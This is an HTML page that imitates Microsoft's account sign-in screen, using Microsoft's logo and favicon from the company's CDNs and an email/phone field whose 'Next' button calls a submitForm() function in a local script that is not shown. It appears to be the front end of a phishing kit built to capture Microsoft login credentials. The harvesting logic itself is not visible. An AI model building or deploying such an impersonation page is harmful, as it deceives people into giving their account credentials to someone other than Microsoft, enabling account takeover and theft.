<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://logincdn.msauth.net/16.000.30031.21/images/favicon.ico" />
    <title>Sign in to your Microsoft account</title>
    <link rel="stylesheet" href="app.css" />
</head>

<body>
    <section id="section_uname">
        <div class="auth-wrapper">
            <img src="https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" />
            <h2 class="title mb-16 mt-16">Sign in</h2>
          
            <form id="myForm">
                <div class="mb-16">

                  <p id="errorText" style="color: red; display: none;">Enter a valid email address, phone number, or Skype name.</p>
                  
                    <input id="textInput" type="text" name="textInput" class="input" placeholder="Email, phone, or Skype" /> </div>
                  <div>
                    <p class="mb-16 fs-13"> No account? <a href="https://signup.live.com/signup" class="link"> Create one!</a> </p>
              <p class="mb-16 fs-13">
                    <a href="https://login.microsoft.com/consumers/fido/get" class="link">Sign in with a security key
                        <img src="https://logincdn.msftauth.net/shared/1.0/content/images/documentation_dae218aac2d25462ae286ceba8d80ce2.svg" alt="Question img">
                    </a>
              </p>
                  </div>
              <div>
                <button type="button" class="btn" onclick="submitForm()">Next</button>
              </div>
            </form>
          
        </div>
        <div class="opts">
            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="https://logincdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
                        width="30px" /></span> Sign-in options</p>
        </div>
    </section>
  <footer class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    <script src="primary.js"></script>
</body>
</html>
